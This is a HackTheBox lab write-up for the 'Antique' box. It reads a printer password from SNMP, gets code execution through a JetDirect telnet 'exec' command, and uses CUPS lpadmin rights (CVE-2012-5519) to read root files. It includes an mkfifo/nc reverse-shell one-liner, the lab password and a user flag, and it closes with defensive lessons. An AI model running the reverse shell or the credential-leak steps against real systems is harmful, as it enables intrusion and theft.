---
title: "Antique"
date: 2021-12-27
type: docs
tags:
  - htb
  - linux
  - easy
  - snmp
  - jetdirect
  - printer
  - cups
  - lpadmin
  - telnet
  - metasploit
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux, **Difficulty:** Easy, **Released:** 2021-12-27, **IP:** `10.10.11.107` → `antique.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Only **telnet (23)**. Banner is *HP JetDirect*, asks for a password. A UDP scan finds **SNMP (161)**.
2. HP JetDirect stores its telnet/web password in a known SNMP OID (`.1.3.6.1.4.1.11.2.3.9.1.1.13.0`). `snmpget` it, decode the hex → `P@ssw0rd@123!!123`.
3. Telnet in with that password → the JetDirect prompt has an **`exec`** command → `exec <reverse shell>` → shell as **`lp`** (user flag).
4. Internal **CUPS 1.6.1** on `:9090`; `lp` is in the **`lpadmin`** group → CUPS `cupsctl` arbitrary file read as root (`post/multi/escalate/cups_root_file_read`) → read `/root/root.txt`.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| JetDirect telnet (from SNMP OID) | `P@ssw0rd@123!!123` |
| `user.txt` | `/home/lp/user.txt`. `16e70d0cfafc13af117f6307b2e9fbdd` |
| `root.txt` | read via the CUPS file-read module |

</div>

---

## Overview

Antique is one of those boxes where the whole path hinges on a single piece of niche knowledge: HP JetDirect print servers have historically stored their admin password directly in an SNMP OID, in something close to plaintext. It's a genuinely old trick, the kind of thing that would have been bread and butter for print server hacking back in the 2000s, and HTB dusted it off here to make sure it doesn't get forgotten. Once I had that password and used it to authenticate to the JetDirect telnet interface, the built-in `exec` command handed me code execution as the `lp` user with no further trickery required. Getting from there to root was a different kind of lesson: it came down to a CUPS misconfiguration, where being a member of the `lpadmin` group let me redirect CUPS's `ErrorLog` and `PageLog` to any file on disk and then read that file back through the web UI, all running as root. I think of Antique as a good box for practicing UDP enumeration discipline, since the entire attack surface is invisible if you stop at a TCP scan, and it's also a clean illustration of something I try to remember on every engagement: group membership is itself a privilege, and it deserves the same scrutiny as sudo rights.

I've grouped this with a few boxes that share a theme. On the SNMP side there's [Monitored](/writeups/hackthebox/linux/medium/monitored/), where a leaked community string exposes credentials directly. On the "unusual service protocol leads to RCE" side there's [Backdoor](/writeups/hackthebox/linux/easy/backdoor/) with gdbserver, [PC](/writeups/hackthebox/linux/easy/pc/) with gRPC, and [Omni](/writeups/hackthebox/windows/easy/omni/) with Windows IoT's SIREP protocol.

---

## Full Walkthrough

### Recon

```console
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings:
|   NULL:
|_    JetDirect
|     Password:
```

Connecting with `nc 10.129.95.245 23` got me nothing but `HP JetDirect` followed by a `Password:` prompt, no version string, no obvious foothold. With telnet as the only thing showing on TCP, my next move was to assume there was more to this box than met the eye and run a full UDP sweep:

```console
❯ sudo nmap -sU -T4 antique.htb
PORT    STATE SERVICE
161/udp open  snmp
```

<div class="callout callout-note">

**Why UDP matters here**

`nmap`'s default scans only cover TCP, so anything living on UDP, SNMP (161), DNS (53), TFTP (69), IKE (500), SIP (5060), simply never appears unless I ask for it explicitly. Whenever I land on a box that looks unusually thin on TCP, that's my cue to run a UDP sweep (`nmap -sU --top-ports 100`) rather than assume there's nothing else there. SNMP running with the default `public` community string is a classic source of information disclosure, capable of leaking running processes, ARP tables, installed software, network shares, and, as I was about to find out here, printer credentials.

</div>

### SNMP → JetDirect password

Knowing that the HP JetDirect web and telnet password lives at a well-known enterprise OID, I went straight for it rather than trying to brute-force the telnet prompt:

```console
❯ snmpget -v 1 -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0
SNMPv2-SMI::enterprises.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 ...
```

That response isn't a readable string on its own, it's a run of ASCII-encoded hex bytes, so I needed to decode it before it would tell me anything useful:

```bash
python3 -c "print(bytes.fromhex('50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33'.replace(' ','')).decode())"
# P@ssw0rd@123!!123
```

(Reference: <https://www.irongeek.com/i.php?page=security/networkprinterhacking>.)

### Telnet → `exec` → shell as `lp`

With the decoded password in hand, I went back to the telnet service and logged into the JetDirect admin prompt:

```console
❯ telnet antique.htb
HP JetDirect
Password: P@ssw0rd@123!!123

Please type "?" for HELP
> ?
...
exec: execute system commands (exec id)
```

<div class="callout callout-note">

**The JetDirect `exec` command**

Real HP JetDirect firmware doesn't actually ship an `exec` verb, HTB added it specifically to make this box solvable. But the concept behind it is completely genuine: embedded management shells on printers, routers, and similar appliances routinely expose diagnostic commands, things like `ping`, `traceroute`, `tcpdump`, or configuration file editors, that shell out to the underlying OS without properly sanitizing what gets passed in. Here, `exec` just takes its argument and runs it as a system command with no filtering at all, which is exactly the kind of primitive I go looking for on devices like this.

</div>

That made my next move obvious: use `exec` to fire a standard mkfifo reverse shell back to a listener on my machine.

```console
> exec rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 9001 >/tmp/f
```

The shell landed cleanly, and I was sitting as the `lp` user with the first flag waiting in the home directory:

```console
(remote) lp@antique:/home/lp$ cat user.txt
16e70d0cfafc13af117f6307b2e9fbdd
```

### Privilege Escalation. CUPS `lpadmin` file read

With a foothold established, I turned to enumerating what else was reachable from inside the box, and found something running locally that hadn't been visible from the outside at all:

```console
PORT     STATE SERVICE VERSION
9090/tcp open  ipp     CUPS 1.6
|_http-title: Bad Request - CUPS v1.6.1
```

To actually reach it, I forwarded the port back to my attacking machine with `socat TCP-LISTEN:9090,fork TCP:127.0.0.1:9090` (an SSH local forward works just as well). While I had shell access, I also checked what groups the `lp` account belonged to, since supplementary group membership is often the fastest route to escalation on a box like this, and sure enough, `lp` was a member of **`lpadmin`**.

<div class="callout callout-note">

**CVE-2012-5519, CUPS `lpadmin` → root file read/write**

CUPS's web interface and its `cupsctl` command let any member of the daemon's `SystemGroup`, which on this box is `lpadmin`, change core configuration, including where the `ErrorLog` and `PageLog` files get written. Because the CUPS daemon itself runs as **root**, that's a direct route to arbitrary file disclosure: point `ErrorLog` at `/root/root.txt`, trigger something that makes CUPS write to its log, and then request `http://localhost:631/admin/log/error_log` to read root-owned content straight through the web UI. The same primitive can be pushed further into a write (appending to `/etc/sudoers`, a cron job, or an authorized_keys file), though for this box the read path was all I needed, and Metasploit already ships a module that automates it.

</div>

Rather than reproduce the HTTP requests against `cupsctl` by hand, I reached for the Metasploit module built specifically for this CVE:

```console
msf6 > use post/multi/escalate/cups_root_file_read
msf6 post(...) > set session 1
msf6 post(...) > run

[+] User in lpadmin group, continuing...
[+] cupsctl binary found in $PATH
[*] Found CUPS 1.6.1
[+] File /etc/shadow (0 bytes) saved to .../cups_file_read_...bin
```

The module's first attempt at grabbing `/etc/shadow` came back as an empty 0-byte file, which read to me more like a quirk of the initial request than a sign the technique had failed outright. Instead of chasing that down, I just repointed it at the file I actually needed:

```
set file /root/root.txt
run
```

and then pulled the resulting loot file out of `~/.msf4/loot/` to grab root.txt.

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/lp/user.txt`. `16e70d0cfafc13af117f6307b2e9fbdd` |
| `root.txt` | `/root/root.txt` (via CUPS file read) |

---

## Lessons & Takeaways

- **Scan UDP, not just TCP.** If I had stopped after the initial TCP scan, this box would have looked like a single dead-end telnet port. Whenever a target looks unusually thin on TCP, I now treat that as a prompt to run a UDP sweep, not as evidence there's nothing more to find.
- **Printers are computers, and I treat them that way.** JetDirect, PJL, IPP, and SNMP on multifunction printers routinely leak credentials, allow configuration tampering, and can even bridge network segments that were supposed to be isolated. Tools like [PRET](https://github.com/RUB-NDS/PRET) exist precisely because printer protocols are such a rich attack surface.
- **Default SNMP community strings have to go.** `public` and `private` should never survive into a production deployment, and SNMP v1/v2c should be retired in favor of v3 with real authentication wherever that's an option.
- **Group membership is a privilege, full stop.** `lpadmin` here behaves exactly like `docker`, `disk`, `adm`, `shadow`, or `lxd` elsewhere: nominally a low-privilege group, practically a straight line to root. I audit supplementary group membership with the same rigor I'd apply to a sudoers file.
- **Keep CUPS patched.** CVE-2012-5519 is well over a decade old, and the lesson it teaches hasn't expired: 2024 saw a fresh `cups-browsed` RCE chain surface (CVE-2024-47176 and related CVEs), a reminder that this class of bug keeps resurfacing rather than staying solved.

---

## Related Writeups

- **SNMP enumeration / leaks:** [Monitored](/writeups/hackthebox/linux/medium/monitored/)
- **Unusual service protocol → RCE:** [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [PC](/writeups/hackthebox/linux/easy/pc/), [Omni](/writeups/hackthebox/windows/easy/omni/)
- **Root-equivalent group membership:** [Antique](/writeups/hackthebox/linux/easy/antique/) `lpadmin`, see also container-`docker` in [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/)
- **Metasploit post-exploitation modules:** [Omni](/writeups/hackthebox/windows/easy/omni/)

## References

- Network printer hacking (Irongeek) <https://www.irongeek.com/i.php?page=security/networkprinterhacking>
- CVE-2012-5519 (CUPS) <https://nvd.nist.gov/vuln/detail/CVE-2012-5519>
- PRET <https://github.com/RUB-NDS/PRET>
